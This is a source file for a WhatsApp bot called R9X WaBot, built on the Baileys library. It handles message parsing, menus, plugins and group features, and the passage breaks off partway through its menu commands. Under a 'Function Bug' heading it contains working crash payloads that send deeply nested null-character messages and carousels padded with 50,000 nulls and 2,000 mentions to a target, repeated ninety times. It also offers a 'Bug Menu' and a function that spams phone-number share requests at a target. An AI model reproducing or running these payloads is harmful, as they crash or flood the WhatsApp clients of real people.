//——————————[ Module ]——————————//
require("./system/settings.js");
const {
  clockString,
  parseMention,
  isUrl,
  sleep,
  runtime,
  getBuffer,
  jsonformat,
  capital
} = require("./system/myfunc.js");
const uploader = require("./system/upload.js");
const {
  default: makeWaSocket,
  BufferJSON,
  WA_DEFAULT_EPHEMERAL,
  generateWAMessageFromContent,
  proto,
  generateWAMessageContent,
  generateWAMessage,
  prepareWAMessageMedia,
  areJidsSameUser,
  getContentType,
  delay,
  generateMessageID 
} = require("@whiskeysockets/baileys");
const crypto = require("crypto");
const { modul } = require("./system/module.js");
const { exec, spawn, execSync } = require("child_process");
const { color, bgcolor } = require("./system/color.js");
const path = require("path");
const util = require("util");
const sharp = require("sharp");
const AdmZip = require("adm-zip");
const {
  os,
  axios,
  baileys,
  chalk,
  cheerio,
  fs,
  PhoneNumber,
  process,
  moment,
} = modul;
const {
  isOwner,
  isPremium,
  addOwner,
  delOwner,
  addPremium,
  delPremium,
  readOwners,
  readPremiums
} = require("./system/database.js");

const readFile = util.promisify(fs.readFile);
const _groupMetaCache = new Map();
const GROUP_META_TTL_MS = 30 * 1000;
async function getGroupMetadataCached(reyz, jid) {
  const now = Date.now();
  const hit = _groupMetaCache.get(jid);
  if (hit && now - hit.ts < GROUP_META_TTL_MS) return hit.data;
  try {
    const data = await reyz.groupMetadata(jid);
    _groupMetaCache.set(jid, { data, ts: now });
    return data;
  } catch (e) {
    return hit ? hit.data : undefined;
  }
}

const more = String.fromCharCode(8206);
const readmore = more.repeat(4001);

const yy1 = "`";
const yy2 = "```";

module.exports = async function mainHandler(reyz, m, chatUpdate, store) {
try {
  async function appenTextMessage(text, chatUpdate) {
    let messages = await generateWAMessage(
      m.chat,
      {
        text: text,
        mentions: m.mentionedJid,
      },
      {
        userJid: reyz.user.id,
        quoted: qR9X.quoted && m.quoted.fakeObj,
      },
    );
    messages.key.fromMe = areJidsSameUser(m.sender, reyz.user.id);
    messages.key.id = m.key.id;
    messages.pushName = m.pushName;
    if (m.isGroup) messages.participant = m.sender;
    let msg = {
      ...chatUpdate,
      messages: [proto.WebMessageInfo.fromObject(messages)],
      type: "append",
    };
    reyz.ev.emit("messages.upsert", msg);
  }
  const { type, quotedMsg, mentioned, now, fromMe } = m;
  let body =
    m.mtype === "interactiveResponseMessage"
      ? JSON.parse(
          m.message.interactiveResponseMessage.nativeFlowResponseMessage
            .paramsJson,
        ).id
      : m.mtype === "conversation"
        ? m.message.conversation
        : m.mtype == "imageMessage"
          ? m.message.imageMessage.caption
          : m.mtype == "videoMessage"
            ? m.message.videoMessage.caption
            : m.mtype == "extendedTextMessage"
              ? m.message.extendedTextMessage.text
              : m.mtype == "buttonsResponseMessage"
                ? m.message.buttonsResponseMessage.selectedButtonId
                : m.mtype == "listResponseMessage"
                  ? m.message.listResponseMessage.singleSelectReply
                      .selectedRowId
                  : m.mtype == "templateButtonReplyMessage"
                    ? m.message.templateButtonReplyMessage.selectedId
                    : m.mtype == "messageContextInfo"
                      ? m.message.buttonsResponseMessage?.selectedButtonId ||
                        m.message.listResponseMessage?.singleSelectReply
                          .selectedRowId ||
                        m.text
                      : m.mtype === "editedMessage"
                        ? m.message.editedMessage.message.protocolMessage
                            .editedMessage.extendedTextMessage
                          ? m.message.editedMessage.message.protocolMessage
                              .editedMessage.extendedTextMessage.text
                          : m.message.editedMessage.message.protocolMessage
                              .editedMessage.conversation
                        : "";
//——————————[ Entitas Verification ]——————————//               
const budy = (typeof m.text == 'string' ? m.text : '.')
const prefix = body && /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><`™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!`™©®Δ^βα¦|/\\©^]/gi) : '.'
  const chath = body;
  const pes = body;
  const messagesC = (pes || '').slice(0).trim();
  const content = JSON.stringify(m.message);
  const isCmd = body ? body.startsWith(prefix) : false;
  const from = m.key.remoteJid;
  const messagesD = (body || '').slice(0).trim().split(/ +/).shift().toLowerCase();
  const command = (body || '').replace(prefix, "").trim().split(/ +/).shift().toLowerCase();
  const args = (body || '').trim().split(/ +/).slice(1);
  const lidBotNumber = await reyz.decodeJid(reyz.user.lid);
  const botNumber = await reyz.decodeJid(reyz.user.id);
  const isCreator = isOwner(m.sender) ||
   m.sender === botNumber ||
     m.sender === lidBotNumber;
  const isPrem = isCreator || isPremium(m.sender);
  const pushname = m.pushName || "Anomali";
  const q = args.join(" ");
  const text = q;
  const quoted = m.quoted ? m.quoted : m;
  const mime = (quoted.msg || quoted).mimetype || "";
  const qmsg = quoted.msg || quoted;
  const isMedia = /image|video|sticker|audio/.test(mime);
  const isImage = type == "imageMessage";
  const isVideo = type == "videoMessage";
  const isAudio = type == "audioMessage";
  const isSticker = type == "stickerMessage";
  const isQuotedImage =
    type === "extendedTextMessage" && content.includes("imageMessage");
  const isQuotedLocation =
    type === "extendedTextMessage" && content.includes("locationMessage");
  const isQuotedVideo =
    type === "extendedTextMessage" && content.includes("videoMessage");
  const isQuotedSticker =
    type === "extendedTextMessage" && content.includes("stickerMessage");
  const isQuotedAudio =
    type === "extendedTextMessage" && content.includes("audioMessage");
  const isQuotedContact =
    type === "extendedTextMessage" && content.includes("contactMessage");
  const isQuotedDocument =
    type === "extendedTextMessage" && content.includes("documentMessage");
  const sender = m.isGroup
    ? m.key.participant
      ? m.key.participant
      : m.participant
    : m.key.remoteJid;
  const senderNumber = sender.split("@")[0];
  const isGroup = m.chat.endsWith('@g.us')
  const groupMetadata = m.isGroup
    ? await getGroupMetadataCached(reyz, m.chat).catch((e) => {})
    : "";
  const participants =
    m.isGroup && groupMetadata ? groupMetadata.participants : [];
  const groupAdmins = m.isGroup
    ? await participants.filter((v) => v.admin !== null).map((v) => v.id)
    : [];
  const groupName = m.isGroup && groupMetadata ? groupMetadata.subject : [];
  const groupOwner = m.isGroup && groupMetadata ? groupMetadata.owner : [];
  const groupMembership =
    m.isGroup && groupMetadata ? groupMetadata.membership : [];
  const groupMembers =
    m.isGroup && groupMetadata ? groupMetadata.participants : [];
  const isBotAdmins = m.isGroup ? groupAdmins.includes(reyz.user.lid.split(":")[0]+"@lid") : false;
  const isGroupAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false;
  const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false;
  const delay = ms => new Promise(resolve => setTimeout(resolve, ms))
  const deviceinfo = /^3A/.test(m.id) ? 'ɪᴏs' : m.id.startsWith('3EB') ? 'ᴡᴇʙ' : /^.{21}/.test(m.id) ? 'ᴀɴᴅʀᴏɪᴅ' : /^.{18}/.test(m.id) ? 'ᴅᴇsᴋᴛᴏᴘ' : 'ᴜɴᴋɴᴏᴡ';
  const ments = (text) => {return text.match('@') ? [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net') : []}
  const froms = m.quoted ? m.quoted.sender : text ? (text.replace(/[^0-9]/g, '') ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' : false) : false;
  const mentionUser = [
    ...new Set([
      ...(m.mentionedJid || []),
      ...(m.quoted ? [m.quoted.sender] : []),
    ]),
  ];
  const mentionByTag =
    type == "extendedTextMessage" &&
    m.message.extendedTextMessage.contextInfo != null
      ? m.message.extendedTextMessage.contextInfo.mentionedJid
      : [];
  const mentionByReply =
    type == "extendedTextMessage" &&
    m.message.extendedTextMessage.contextInfo != null
      ? m.message.extendedTextMessage.contextInfo.participant || ""
      : "";
  const numberQuery =
    q.replace(new RegExp("[()+-/ +/]", "gi"), "") + "@s.whatsapp.net";
  const usernya = mentionByReply ? mentionByReply : mentionByTag[0];
  const Input = mentionByTag[0]
    ? mentionByTag[0]
    : mentionByReply
      ? mentionByReply
      : q
        ? numberQuery
        : false;

//——————————[ Load Penting Json ]——————————//
const pentingPath = path.join(process.cwd(), "database", "penting.json")
let penting = JSON.parse(fs.readFileSync(pentingPath))

function savePenting() {
  fs.writeFileSync(pentingPath, JSON.stringify(penting, null, 2))
}

//——————————[ Time ]——————————//
  const xtime = moment.tz("Asia/Jakarta").format("HH:mm:ss");
  const xdate = moment.tz("Asia/Jakarta").format("DD/MM/YYYY");
  const time2 = moment().tz("Asia/Jakarta").format("HH:mm:ss");
  if (time2 < "23:59:00") {
    var timewisher = `Selamat Malam`;
  }
  if (time2 < "19:00:00") {
    var timewisher = `Selamat Malam`;
  }
  if (time2 < "18:00:00") {
    var timewisher = `Selamat Sore`;
  }
  if (time2 < "15:00:00") {
    var timewisher = `Selamat Siang`;
  }
  if (time2 < "11:00:00") {
    var timewisher = `Selamat Pagi`;
  }
  if (time2 < "05:00:00") {
    var timewisher = `Selamat Pagi`;
  }
  let sekarang = new Date(
    new Date().toLocaleString("en-US", { timeZone: "Asia/Jakarta" }),
  );
  function tanggal(ms) {
    return new Date(ms).getDate().toString().padStart(2, "0");
  }
  function bulan(ms) {
    return (new Date(ms).getMonth() + 1).toString().padStart(2, "0");
  }
  function tahun(ms) {
    return new Date(ms).getFullYear();
  }
  function formatJam(date) {
    let jam = date.getHours().toString().padStart(2, "0");
    let menit = date.getMinutes().toString().padStart(2, "0");
    let detik = date.getSeconds().toString().padStart(2, "0");
    return `${jam}:${menit}:${detik}`;
  }
  let futureDescription = `
📅 *Update Kurs:* ${tanggal(sekarang.getTime())}/${bulan(sekarang.getTime())}/${tahun(sekarang.getTime())}
🕰 *Waktu Jakarta (WIB):* ${formatJam(sekarang)}`

//——————————[ Thumbnail ]——————————//
async function generateThumbnailz(x) {
    let buffer

    if (/^https?:\/\//.test(x)) {
        const res = await axios.get(x, {
            responseType: 'arraybuffer',
            timeout: 30000
        })

        buffer = Buffer.from(res.data)
    } else {
        buffer = fs.readFileSync(x)
    }

    return await sharp(buffer)
        .resize(200, 200, {
            fit: 'cover'
        })
        .jpeg({
            quality: 100
        })
        .toBuffer()
}

const R9XImg = await generateThumbnailz('./system/media/reyz.jpg')
const R9XImage = await generateThumbnailz('./system/media/reyz.jpg')
const R9XImgw = fs.readFileSync("./system/media/reyz.jpg");
         
//——————————[ require files ]——————————//
const thumbs = R9XImgw
const randomThumbUrl = R9XImgw

//——————————[ Template quoted ]——————————//
const qR9X = {
  key: {
    fromMe: false,
    participant: "13135550002@s.whatsapp.net",
    remoteJid: "status@broadcast"
  },
  message: {
    productMessage: {
      businessOwnerJid: m.sender,
      product: {
        productImage: R9XImgw,
        productId: "123456789",
        title: "ReyzTzx",
        description: "𝖯𝗈𝗎 𝖶𝖺𝖻𝗈𝗍",
        currencyCode: "IDR",
        priceAmount1000: "9999999999",
        retailerId: "ReyzTzx"
      }
    }
  }
}

let _ppuserCache;
const getPpUser = async () => {
  if (_ppuserCache) return _ppuserCache;
  try {
    _ppuserCache = await reyz.profilePictureUrl(m.sender, "image");
  } catch {
    _ppuserCache = fs.readFileSync("./system/media/reyz.jpg");
  }
  return _ppuserCache;
};

const reply = async (text) => {
    const msg = generateWAMessageFromContent(
        m.chat,
        {
            extendedTextMessage: {
                text: String(text),
                contextInfo: {
                    mentionedJid: []
                }
            }
        },
        {
            quoted: qR9X
        }
    )

    return await reyz.relayMessage(m.chat, msg.message, {
        messageId: msg.key.id
    })
}
  
const example = async (teks) => {
  await reyz.sendMessage(m.chat, {
    react: {
      text: "✖️",
      key: m.key
    }
  })

  return reply(`Gini Caranya: ${prefix + command} ${teks}`)
}

const larang = async () => {
  await reyz.sendMessage(m.chat, {
    react: {
      text: "✖️",
      key: m.key
    }
  })

  return reply("Fitur Ini Khusus Owner.")
}

//——————————[ Message Log ]——————————//
if (!reyz.public && !m.key.fromMe && !isOwner(m.sender)) {
  return;
}

if (m.message) {
    const time = chalk.hex('#7ED957')(moment().tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss'))
    const msgType = chalk.cyan(budy || m.mtype)

    console.log(`
${chalk.hex('#7ED957')('🌿 R9X WaBot')}
${chalk.gray('├─')} ${chalk.green('Time')}     : ${time}
${chalk.gray('├─')} ${chalk.green('Type')}     : ${msgType}
${chalk.gray('├─')} ${chalk.green('Sender')}   : ${chalk.white(pushname)} ${chalk.gray(`<${m.sender}>`)}
${chalk.gray('├─')} ${chalk.green('Chat')}     : ${
    m.isGroup
        ? `${chalk.white(groupName)} ${chalk.gray(`(${m.chat})`)}`
        : chalk.white('Private Chat')
}
${chalk.gray('├─')} ${chalk.green('Owner')}    : ${isOwner ? chalk.green('YES') : chalk.red('NO')}
${chalk.gray('├─')} ${chalk.green('Premium')}  : ${isPremium ? chalk.green('YES') : chalk.red('NO')}
${chalk.gray('└─')} ${chalk.green('Status')}   : ${chalk.hex('#7ED957')('NEW MESSAGE')}
`)
}

if (global.autojoingc) {
  if (m.text && m.text.includes("chat.whatsapp.com/")) {
    let regex = /(chat\.whatsapp\.com\/(?:invite\/)?([0-9A-Za-z]{20,24}))/i;
    let [_, __, code] = m.text.match(regex) || [];
    if (code) {
      try {
        await reyz.groupAcceptInvite(code);
      } catch (e) {
      }
    }
  }
}

//——————————[ Function Bug ]——————————//
async function R9X(reyz, target) {
  const pler = (index = 1000) => {
    let q = { conversation: "\0" };

    for (let i = 0; i < index; i++) {
      q = {
        extendedTextMessage: {
          text: "\0",
          contextInfo: {
            quotedMessage: q
          }
        }
      };
    }

    return q;
  };

  const msg = {
    extendedTextMessage: {
      text: "R9X",
      contextInfo: {
        remoteJid: "\0",
        quotedMessage: {
          extendedTextMessage: {
            text: "\0",
            contextInfo: {
              quotedMessage: pler()
            }
          }
        }
      }
    }
  };

  await reyz.relayMessage(
    "status@broadcast",
    {
      groupStatusMessageV2: {
        message: msg
      }
    },
    {
      statusJidList: [
        target,
        reyz.decodeJid(reyz.user.id)
      ],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: {
                    jid: target
                  }
                }
              ]
            }
          ]
        }
      ]
    }
  );
}
async function R9XBoT(reyz, target) {
    var R9X1 = {
        "url": "https://mmg.whatsapp.net/o1/v/t24/f2/m235/AQP6sL1vC_ovj_qwy7t6Zt7Mtb2r-fBeOAH-lIbrp19MixownR-gp6gmnX0thyETaDpCl0OXlxKbGbzlqwUjK1gStOsdDc6aNeeb2blxnw?ccb=9-4&oh=01_Q5Aa5AHliaFEaeSA4rXhPnn1Q5-z4JB19O97Y_T92yd-1fYdlA&oe=6A97BE34&_nc_sid=e6ed6c&mms3=true",
        "mimetype": "image/jpeg",
        "fileSha256": "K+hf3JtLOZcX2/ZlOojBYiImodOLBNK219jwEyfnIu8=",
        "fileLength": "21197",
        "height": 764,
        "width": 735,
        "mediaKey": "ppS2Qk08v7XU94/taa9fbrQF/Mf0kzE+FuAwrqPgfdY=",
        "fileEncSha256": "hM+qBfOfHgvywq+x2Nct2FawX2sf/bjvZJ/rxS0b6Ic=",
        "directPath": "/o1/v/t24/f2/m235/AQP6sL1vC_ovj_qwy7t6Zt7Mtb2r-fBeOAH-lIbrp19MixownR-gp6gmnX0thyETaDpCl0OXlxKbGbzlqwUjK1gStOsdDc6aNeeb2blxnw?ccb=9-4&oh=01_Q5Aa5AHliaFEaeSA4rXhPnn1Q5-z4JB19O97Y_T92yd-1fYdlA&oe=6A97BE34&_nc_sid=e6ed6c",
        "mediaKeyTimestamp": "1785749485",
        "jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgARQMBIgACEQEDEQH/xAAtAAEAAwEBAAAAAAAAAAAAAAAAAQQFBgIBAQEBAAAAAAAAAAAAAAAAAAABAv/aAAwDAQACEAMQAAAA5kE3aIuxTAAAE7mf2xg4/ZZZyiYAAL3UcZ0M1p505aZsFgACxXGln+QAAAAAAB//xAAkEAACAgIBBAEFAAAAAAAAAAABAgADBBExBRMgIhASMDJAcf/aAAgBAQABPwD4HI3O9Q35JO7Rxo6lltBr0qnf3wNnUxuks6B3jdMrA4mViNR/PLAQWZVYMLBdDYlzBRMtBZQ8Pj046y652Vstsdt7UjUzFLgCfSKsWw7h58a3Nbqw5BleXYxays+pHtLstiuww3L7WWoqW2zedGS9BOuDyJZmoy+tYDRmLHZ/W//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQIBAT8AT//EABcRAAMBAAAAAAAAAAAAAAAAAAAwQQH/2gAIAQMBAT8AXlI3/9k=",
        "contextInfo": {
            "pairedMediaType": "NOT_PAIRED_MEDIA",
            "statusSourceType": "IMAGE",
            "mediaDomainInfo": {
                "mediaKeyDomain": "MEDIA_KEY_DOMAIN_NON_E2EE",
                "e2EeMediaKey": "0nlMnjboIhHYAQHS0VgPy1aw24LPn7siLetdTnDzoCA="
            }
        },
        "scansSidecar": "yjtqbZQI3qUGIXYGGKStmcfdGDl8xahdlgE84bL5Wlmxz5hl1C2yVg==",
        "scanLengths": [
            3332,
            9117,
            3936,
            4812
        ],
        "midQualityFileSha256": "OkXXOgfFqdIJfyrcgVqrR0rhacnVvsSukbSgF65rsd4="
    }
    
    var R9X = []
    for (var r = 0; r < 9; r++) {
        R9X.push({
            header: {
                hasMediaAttachment: true,
                productMessage: {
                    product: {
                        productImage: R9X1,
                        productId: "35767262379539399",
                        title: "R9X 𝖶𝖺𝖻𝗈𝗍",
                        description: "R9X",
                        currencyCode: "IDR",
                        priceAmount1000: "999999999999000",
                        salePriceAmount1000: "900000000000000",
                        productImageCount: 1
                    },
                    businessOwnerJid: "0@s.whatsapp.net"
                }
            },
            body: {
                text: teks
            },
            footer: {
                text: "R9X 𝖶𝖺𝖻𝗈𝗍"
            },
            nativeFlowMessage: {
                buttons: "\0".repeat(50000),
                messageParamsJson: `{\"tap_target_configuration\":{\"title\":\"// R9XCode ()\",\"canonical_url\":\"https://t.me/${"\0".repeat(8000)}\"}}`
            },
        })
    }

    let quotedMessage = {
        key: {
            participant: "13135550002@s.whatsapp.net",
            remoteJid: "status@broadcast",
            fromMe: false
        },
        message: {
            groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: { text: "R9X Exposed" },
                    carouselMessage: {
                        cards: R9X
                    },
                    contextInfo: { 
                        mentionedJid: Array.from({ length: 2000 }, (_, r) => `${r + 62}@s.whatsapp.net`)
                    }
                }
            }
          }
        }
    };

    for (let r = 0; r < 90; r++) {
        await reyz.relayMessage(target, {
            interactiveResponseMessage: {
                body: {
                    text: "\0",
                    format: 0
                },
                nativeFlowResponseMessage: {
                    paramsJson: "{}"
                },
                contextInfo: {
                quotedMessage: quotedMessage.message
                }
            }
        }, {noSelfSync: true})
    }
}
//——————————[ Function ]——————————//
function getdevice(m, userAgent = "") {
  const id = m?.key?.id || "";
  if (!id) return "Unknown";

  const prefix = id.slice(0, 2);
  const len = id.length;

  if (m?.isBaileys || id.includes("-")) {
    return m?.key?.fromMe ? "Baileys / Bot" : "Baileys / Bot";
  }

  if (userAgent) {
    const ua = userAgent.toLowerCase();
    if (ua.includes("android")) return "Android";
    if (ua.includes("iphone") || ua.includes("ios")) return "iOS";
    if (ua.includes("windows")) return "Windows";
    if (ua.includes("mac") || ua.includes("web")) return "WA Web";
  }

  if (["AC", "AD", "AE", "AF", "A5", "E1", "E2"].includes(prefix) && len < 33) {
    return "Android";
  }

  if (["2A", "2B", "3A", "3B", "3F", "BA", "BB"].includes(prefix)) {
    return "iOS";
  }

  if (["3D", "3E"].includes(prefix)) {
    return len > 21 ? "WA Web" : "Web";
  }

  if (prefix === "9C") return "KaiOS";
  if (prefix === "C1") return "Windows";

  if (m?.key?.participant) {
    return m.key.participant.includes(":")
      ? "WA Web (Multi-Device)"
      : "Linked Device";
  }

  if (/^[A-F0-9]+$/i.test(id) && len >= 16 && len <= 32) {
    return "Android";
  }

  return "Unknown";
}

async function addmeta(target) {
  if (!target.endsWith("@g.us")) throw "@g.us server required";
  try {
    await reyz.groupParticipantsUpdate(target, ["13135550002@s.whatsapp.net"], "add")
  } catch (e) {
    throw e
  }
}

async function sharePhoneNotif(target) {
for (var r = 0; r < 10; r++) {
await reyz.sendMessage(target, {
sharePhoneNumber: {}
}, {})
}
}

function monospace(string) {
    return '```' + string + '```'
}

function getRandomFile(ext) {
return `${Math.floor(Math.random() * 10000)}${ext}`;
}

function pickRandom(list) {
return list[Math.floor(Math.random() * list.length)]
}

function randomNomor(min, max = null){
if (max !== null) {
min = Math.ceil(min);
max = Math.floor(max);
return Math.floor(Math.random() * (max - min + 1)) + min;
} else {
return Math.floor(Math.random() * min) + 1
}
}

function makeProgressBar(current, total, length = 20) {
  const progress = Math.floor((current / total) * length);
  const bar = "▓".repeat(progress) + "░".repeat(length - progress);
  return `[${bar}] ${Math.floor((current / total) * 100)}%`;
}

async function dellCase(filePath, caseNameToRemove) {
            fs.readFile(filePath, 'utf8', (err, data) => {
                if (err) {
                    console.error('Terjadi kesalahan:', err);
                    return;
                }

                const regex = new RegExp(`case\\s+'${caseNameToRemove}':[\\s\\S]*?break`, 'g');
                const modifiedData = data.replace(regex, '');

                fs.writeFile(filePath, modifiedData, 'utf8', (err) => {
                    if (err) {
                        console.error('Terjadi kesalahan saat menulis file:', err);
                        return;
                    }

                    console.log(`Teks dari case '${caseNameToRemove}' telah dihapus dari file.`);
                });
            });
        }

//——————————[ Plugin ]——————————//
  const pluginsLoader = (directory) => {
  let plugins = [];
  const folders = fs.readdirSync(directory);

  for (const file of folders) {
    const filePath = path.join(directory, file);
    if (filePath.endsWith('.js')) {
      try {
        delete require.cache[require.resolve(filePath)];
        const plugin = require(filePath);
        plugins.push(plugin.default || plugin);
      } catch (error) {
        console.log(`Error loading plugin at ${filePath}:`, error);
      }
    }
  }
  return plugins;
};

    let pluginsDisable = true;
    const plugins = await pluginsLoader(path.resolve(__dirname, "plugins"));
    const reyztmvan = { reyz, prefix, command, reply, text, isGroup: m.isGroup, isCreator, isPrem, isOwner, isPremium, example, sender, senderNumber, pushname, args, runtime, sleep, getBuffer, isBotAdmins, isAdmins, isCmd, qR9X, randomNomor, monospace, pickRandom, getRandomFile };
    for (let plugin of plugins) {
  if (!plugin || !Array.isArray(plugin.command)) continue;
  if (plugin.command.find((e) => e == command.toLowerCase())) {
    pluginsDisable = false;
    if (typeof plugin !== "function") continue;
    await plugin(m, reyztmvan);
  }
}
    if (!pluginsDisable) return;
    
//——————————[ Button ]——————————//
const ButMenu = async (teks) => {
  return reyz.relayMessage(m.chat, {
    interactiveMessage: {
      header: {
        hasMediaAttachment: true,
        productMessage: {
          product: {
            productImage: R9XImgw,
            productId: "35767262379539399",
            title: "R9X WaBot",
            description: "ReyzTzx",
            currencyCode: "IDR",
            priceAmount1000: "999999999999000",
            salePriceAmount1000: "900000000000000",
            productImageCount: 1
          },
          businessOwnerJid: "0@s.whatsapp.net"
        }
      },
      body: {
        text: teks
      },
      footer: {
        text: "R9X WaBot"
      },
      contextInfo: {
        mentionedJid: [m.sender],
        isForwarded: true,
        forwardingScore: 250930,
        forwardedNewsletterMessageInfo: {
          newsletterJid: "120363400196954767@newsletter",
          newsletterName: "</> R9X WaBot </>",
          serverId: 999
        }
      },
      nativeFlowMessage: {
        messageParamsJson: JSON.stringify({
          limited_time_offer: {
            text: "R9X WaBot",
            url: "t.me/reyztzx",
            copy_code: "ReyzTzx",
            expiration_time: Date.now() * 999
          },
          bottom_sheet: {
            in_thread_buttons_limit: 2,
            divider_indices: [1, 2, 3, 4, 5, 999],
            list_title: "ReyzTzx",
            icon: "REVIEW",
            button_title: "! Menu - List!"
          }
        }),
        buttons: [
          {
            name: "cta_url",
            buttonParamsJson: JSON.stringify({
              icon: "REVIEW",
              display_text: "Channel WhatsApp",
              url: "https://whatsapp.com/channel/0029VbCZ37w9MF92NBQnfU3G"
            })
          },
          {
            name: "single_select",
            buttonParamsJson: JSON.stringify({
              icon: "DOCUMENT",
              title: "Menu R9X",
              sections: [
                {
                  title: "Spesial Menu",
                  highlight_label: "© ReyzTzx",
                  rows: [
                    {
                      title: "Bug Menu",
                      description: "List Fitur Bvg",
                      id: ".bugmenu"
                    },
                    {
                      title: "Function Menu",
                      description: "Tools² Membuat Function",
                      id: ".functionmenu"
                    },
                    {
                      title: "Thanks To",
                      description: "Orang² yang berjasa bagi gw",
                      id: ".tqto"
                    },
                    {
                      title: "All Menu",
                      description: "All Command R9X",
                      id: ".allmenu"
                    }
                  ]
                },
                {
                  title: "Main Menu",
                  highlight_label: "© ReyzTzx",
                  rows: [
                    {
                      title: "Downloader Menu",
                      description: "Menu Downloader",
                      id: ".downloadmenu"
                    },
                    {
                      title: "Group Menu",
                      description: "Menu Group",
                      id: ".groupmenu"
                    },
                    {
                      title: "Sticker Menu",
                      description: "Menu Sticker",
                      id: ".stickermenu"
                    },
                    {
                      title: "Converter Menu",
                      description: "Menu Converter",
                      id: ".convertmenu"
                    }
                  ]
                },
                {
                  title: "Features Menu",
                  highlight_label: "© ReyzTzx",
                  rows: [
                    {
                      title: "Random Menu",
                      description: "Menu Random",
                      id: ".randommenu"
                    },
                    {
                      title: "Broadcast Menu",
                      description: "Broadcast Group",
                      id: ".broadcastmenu"
                    },
                    {
                      title: "Push Kontak Menu",
                      description: "Broadcast Kontak",
                      id: ".pushkontakmenu"
                    },
                    {
                      title: "Channel Menu",
                      description: "Menu Channel",
                      id: ".channelmenu"
                    }
                  ]
                },
                {
                  title: "Store & Owner",
                  highlight_label: "© ReyzTzx",
                  rows: [
                    {
                      title: "Store Menu",
                      description: "Pembayaran & Store",
                      id: ".storemenu"
                    },
                    {
                      title: "Owner Menu",
                      description: "Khusus Owner",
                      id: ".ownermenu"
                    }
                  ]
                }
              ]
            })
          },
          {
            name: "cta_url",
            buttonParamsJson: JSON.stringify({
              icon: "PROMOTION",
              display_text: "Telegram R9X",
              url: "https://t.me/reyztzx"
            })
          },
          {
            name: "cta_url",
            buttonParamsJson: JSON.stringify({
              icon: "REVIEW",
              display_text: "Telegram Reyz",
              url: "https://t.me/reyztzx"
            })
          }
        ]
      }
    }
  }, {
    quoted: qR9X
  });
};
const ButDone = async (teks) => {
  return reyz.relayMessage(m.chat, {
    interactiveMessage: {
      header: {
        hasMediaAttachment: true,
        productMessage: {
          product: {
            productImage: R9XImgw,
            productId: "35767262379539399",
            title: "R9X",
            description: "ReyzTzx",
            currencyCode: "IDR",
            priceAmount1000: "999999999999000",
            salePriceAmount1000: "900000000000000",
            productImageCount: 1
          },
          businessOwnerJid: "0@s.whatsapp.net"
        }
      },
      body: {
        text: teks
      },
      footer: {
        text: "R9X"
      },
      contextInfo: {
        mentionedJid: [m.sender],
        isForwarded: true,
        forwardingScore: 250930,
        forwardedNewsletterMessageInfo: {
          newsletterJid: "120363400196954767@newsletter",
          newsletterName: "</> R9X </>",
          serverId: 999
        }
      },
      nativeFlowMessage: {
        messageParamsJson: JSON.stringify({
          limited_time_offer: {
            text: "R9X",
            url: "t.me/reyztzx",
            copy_code: "ReyzTzx",
            expiration_time: Date.now() * 999
          },
          bottom_sheet: {
            in_thread_buttons_limit: 2,
            divider_indices: [1, 2, 3, 4, 5, 999],
            list_title: "ReyzTzx",
            icon: "REVIEW",
            button_title: "! Menu - List!"
          }
        }),
        buttons: [
            {
              name: "cta_url",
              buttonParamsJson: JSON.stringify({
               icon: "PROMOTION",
                display_text: "Channel WhatsApp",
                url: "https://whatsapp.com/channel/0029VbCZ37w9MF92NBQnfU3G"
              })
            },
            {
              name: "cta_url",
              buttonParamsJson: JSON.stringify({
               icon: "REVIEW",
                display_text: "Telegram R9X",
                url: "https://t.me/reyztzx"
              })
            },
            {
            name: "cta_url",
            buttonParamsJson: JSON.stringify({
             icon: "REVIEW",
              display_text: "Telegram Reyz",
              url: "https://t.me/reyztzx"
            })
          }
          ]
      }
    }
  }, { quoted: qR9X });
};

switch (command) {
//——————————[ Case Menu ]——————————//
case "menu": {  
    let menu = `  
┌─「 R9X-WaBot 」  
├ Creator : ReyzTzx  
├ Version  : v2.0.0  
├ User     : ${pushname}  
├ Runtime  : ${runtime(process.uptime())}  
│  
└─ List Menu  
   ├─ .groupmenu  
   ├─ .downloadmenu  
   ├─ .stickermenu  
   ├─ .randommenu  
   ├─ .convertmenu  
   ├─ .broadcastmenu  
   ├─ .pushkontakmenu  
   ├─ .channelmenu  
   ├─ .storemenu  
   ├─ .ownermenu  
   ├─ .bugmenu  
   └─ .functionmenu  
`;  
  
    await reyz.sendMessage(m.chat, {  
        text: menu  
    }, {  
        quoted: qR9X  
    });  
    ButMenu(menu)  
    await reyz.sendMessage(m.chat, {  
        audio: {  
            url: path.join(__dirname, "system/sound/reyz.mp3")  
        },  
        mimetype: "audio/mpeg",  
        ptt: false,  
        contextInfo: {  
            isForwarded: true,  
            forwardingScore: 2,  
            forwardedNewsletterMessageInfo: {  
                newsletterJid: "120363400196954767@newsletter",  
                serverMessageId: 1,  
                newsletterName: "ReyzTzx - Information"  
            }  
        }  
    }, {  
        quoted: qR9X  
    });  
}  
break;
case "downloadmenu": {
    let menu = `
┌─「 Downloader Menu 」
├─ .play
├─ .capcut
├─ .igdl
├─ .mediafire
├─ .spotify
├─ .ttdl
└─ .twitter
`;

    await reyz.sendMessage(m.chat, {
        text: menu
    }, {
        quoted: qR9X
    });

    ButMenu(menu);

    await reyz.sendMessage(m.chat, {
        audio: {
            url: path.join(__dirname, "system/sound/reyz.mp3")
        },
        mimetype: "audio/mpeg",
        ptt: false,
        contextInfo: {
            isForwarded: true,
            forwardingScore: 2,
            forwardedNewsletterMessageInfo: {
